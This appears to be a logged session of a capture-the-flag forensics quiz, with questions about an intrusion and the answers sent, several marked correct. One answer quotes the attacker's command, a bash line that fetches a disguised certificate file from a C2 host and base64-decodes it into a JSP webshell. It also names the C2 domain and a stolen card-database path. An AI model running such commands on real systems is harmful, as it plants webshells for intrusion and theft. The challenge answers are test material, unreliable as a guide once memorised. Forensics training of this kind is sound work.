@@ -1,0 +1,73 @@
+
+ooooo   ooooo   .oooooo.   ooo        ooooo ooooo     ooo  .oooooo..o
+`888'   `888'  d8P'  `Y8b  `88.       .888' `888'     `8' d8P'    `Y8
+ 888     888  888           888b     d'888   888       8  Y88bo.
+ 888ooooo888  888           8 Y88. .P  888   888       8   `"Y8888o.
+ 888     888  888           8  `888'   888   888       8       `"Y88b 8888888
+ 888     888  `88b    ooo   8    Y     888   `88.    .8'  oo     .d8P
+o888o   o888o  `Y8bood8P'  o8o        o888o    `YbodP'    8""88888P'
+
+  .oooooo.   ooooooooooooo oooooooooooo
+ d8P'  `Y8b  8'   888   `8 `888'     `8
+888               888       888
+888               888       888oooo8
+888               888       888    "
+`88b    ooo       888       888
+ `Y8bood8P'      o888o     o888o
+
+Answer all the questions correctly to retrieve the flag.
+
+What is the IP address of the threat actor?
+Answer:
+>>> SEND: 172.28.13.20
+Correct!
+
+How many ports were scanned by the attacker?
+Answer:
+>>> SEND: 100
+Correct!
+
+What tool did the attacker use to perform fuzzing?
+Answer:
+>>> SEND: ffuf
+Correct!
+
+What is the C2 domain (domain:port)?
+Answer:
+>>> SEND: assets-acme-cdn.com:9001
+Correct!
+
+What is the command did the attacker make the victim to run?
+Answer:
+>>> SEND: bash -c {curl,-fsSL,http://assets-acme-cdn.com:9001/assets/crm-cache.crt,-o,/opt/acme-crm/runtime/.crm-cache.crt};{grep,-v,CERTIFICATE,/opt/acme-crm/runtime/.crm-cache.crt}|{base64,-d}>/usr/local/tomcat/webapps/ROOT/uploads/.crm-cache.jsp
+Correct!
+
+What is the name of the first malicious file did the victim download to the system?
+Answer:
+>>> SEND: crm-cache.crt
+Correct!
+
+What is the MITRE ATT&CK Technique of the technique that the attacker used to plant the webshell?
+Answer:
+>>> SEND: T1140
+Correct!
+
+Nonce (in hex)?
+Answer:
+>>> SEND: b7a31dc90e2445a8f0c11729
+Correct!
+
+What is the MITRE ATT&CK ID technique that the attacker used to exfiltrate files from the victim?
+Answer:
+>>> SEND: T1041
+Incorrect answer. Connection closed.
+
+>>> SEND: certsync.crt
+
+>>> SEND: font-cache.py
+
+>>> SEND: /opt/acme-crm/backups/customer_cards.sqlite
+
+>>> SEND: C-6767
+
+>>> SEND: Jason Ho
